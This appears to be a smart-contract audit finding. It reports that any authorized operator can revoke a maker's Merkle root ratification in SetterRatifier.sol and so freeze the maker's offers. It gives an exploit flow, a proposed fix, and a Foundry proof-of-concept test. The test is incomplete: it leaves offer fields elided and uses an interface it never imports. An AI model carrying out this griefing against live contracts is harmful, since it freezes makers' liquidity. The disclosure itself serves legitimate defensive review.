### Title
Authorized Operator Can Unilaterally Revoke Maker's Merkle Root Ratification, Freezing All Offers Under That Root - (File: src/ratifiers/SetterRatifier.sol)

### Summary
`SetterRatifier.setIsRootRatified` uses Midnight's flat, coarse-grained `isAuthorized[maker][operator]` boolean as its sole access control. Any operator the maker has ever authorized — for any purpose — can call `setIsRootRatified(maker, root, false)`, setting `isRootRatified[maker][root]` to `false` and causing every subsequent `take` of any offer in that Merkle tree to revert with `RatifierFail()`. The maker can re-ratify, but the operator can immediately revoke again, creating a persistent griefing loop with no on-chain remedy short of revoking the operator's global authorization.

### Finding Description

**Code path:**

`SetterRatifier.setIsRootRatified` (line 24–28):
```solidity
function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
    isRootRatified[maker][root] = newIsRootRatified;
    emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
}
``` [1](#0-0) 

The only guard is `IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender)`. This mapping is a flat, unscoped boolean: [2](#0-1) 

There is no distinction between "authorized to repay" and "authorized to revoke Merkle roots." Any operator that passes `isAuthorized[maker][operator] == true` — regardless of why the maker granted it — satisfies the check.

**Trigger in `take`:**

`Midnight.take` (line 355–356) calls the ratifier and reverts if it does not return `CALLBACK_SUCCESS`: [3](#0-2) 

`SetterRatifier.isRatified` (line 35) enforces:
```solidity
require(isRootRatified[offer.maker][root], NotRatified());
``` [4](#0-3) 

Once `isRootRatified[maker][root]` is `false`, every `take` for every offer in that tree reverts with `NotRatified()` → `RatifierFail()`.

**Exploit flow:**
1. Maker grants authorization to operator for any purpose: `midnight.setIsAuthorized(operator, true, maker)`.
2. Maker ratifies a Merkle root: `setterRatifier.setIsRootRatified(maker, root, true)`.
3. Operator calls `setterRatifier.setIsRootRatified(maker, root, false)` — passes the authorization check.
4. All `take` calls for offers under `root` now revert with `RatifierFail()`.
5. Maker calls `setIsRootRatified(maker, root, true)` to recover; operator immediately calls `false` again. Loop continues indefinitely.

**Why existing checks fail:**

There is no scoped authorization, no action-specific permission, and no cooldown or lock. The `isAuthorized` flag is binary and global. The `SetterRatifier` does not require `msg.sender == maker` for the destructive `false` direction.

### Impact Explanation
All offers belonging to the maker that reference the revoked root become permanently unfillable for as long as the operator holds authorization. Takers receive `RatifierFail()` on every `take` attempt. The maker's liquidity provision is effectively frozen without any fund loss, but with complete loss of offer availability for the affected Merkle tree.

### Likelihood Explanation
**Preconditions:** Maker must have granted `isAuthorized[maker][operator] = true` for any reason. This is a normal operational action (e.g., authorizing a keeper, a repay bot, or a portfolio manager). **Feasibility:** The attack is a single external call with no capital requirement. **Repeatability:** The operator can re-invoke `setIsRootRatified(maker, root, false)` in the same block as the maker's recovery call, making it a persistent griefing vector. The only remedy is revoking the operator's global authorization, which may break the legitimate purpose for which it was granted.

### Recommendation
Add a direction restriction: only the maker (or a specifically designated "root manager") should be able to set `newIsRootRatified = false`. Authorized operators should only be permitted to set it to `true` (ratify), not `false` (de-ratify). Concretely:

```solidity
function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    if (!newIsRootRatified) {
        require(maker == msg.sender, Unauthorized()); // only maker can revoke
    } else {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
    }
    isRootRatified[maker][root] = newIsRootRatified;
    emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
}
```

Alternatively, introduce scoped authorization (action-level permissions) in Midnight itself, analogous to ERC-4337 session keys.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {SetterRatifier} from "src/ratifiers/SetterRatifier.sol";
import {IMidnight, Offer} from "src/interfaces/IMidnight.sol";
import {HashLib} from "src/ratifiers/libraries/HashLib.sol";
import {BaseTest} from "test/BaseTest.sol";

contract OperatorRevokeRootTest is BaseTest {
    SetterRatifier internal setterRatifier;

    function setUp() public override {
        super.setUp();
        setterRatifier = new SetterRatifier(address(midnight));
    }

    function testOperatorCanRevokeRootAndFreezeOffers() public {
        address maker = lender;
        address operator = makeAddr("operator");

        // Build offer and root
        Offer memory offer;
        offer.maker = maker;
        offer.ratifier = address(setterRatifier);
        // ... (fill remaining offer fields as in SetterRatifierTest.makeOffer)
        bytes32 root = HashLib.hashOffer(offer);

        // Step 1: maker ratifies root
        vm.prank(maker);
        setterRatifier.setIsRootRatified(maker, root, true);
        assertTrue(setterRatifier.isRootRatified(maker, root));

        // Step 2: maker grants operator authorization for any purpose
        vm.prank(maker);
        midnight.setIsAuthorized(operator, true, maker);

        // Step 3: operator revokes root without maker's intent
        vm.prank(operator);
        setterRatifier.setIsRootRatified(maker, root, false);

        // Assert: root is now de-ratified
        assertFalse(setterRatifier.isRootRatified(maker, root));

        // Assert: any take of an offer under this root now reverts with RatifierFail
        vm.prank(address(midnight));
        vm.expectRevert(ISetterRatifier.NotRatified.selector);
        setterRatifier.isRatified(offer, abi.encode(root, 0, new bytes32[](0)));

        // Assert: griefing loop — maker re-ratifies, operator immediately revokes
        vm.prank(maker);
        setterRatifier.setIsRootRatified(maker, root, true);
        vm.prank(operator);
        setterRatifier.setIsRootRatified(maker, root, false);
        assertFalse(setterRatifier.isRootRatified(maker, root));
    }
}
```

**Expected assertions:** `isRootRatified(maker, root)` is `false` after operator call; `isRatified` reverts with `NotRatified`; the griefing loop succeeds indefinitely.
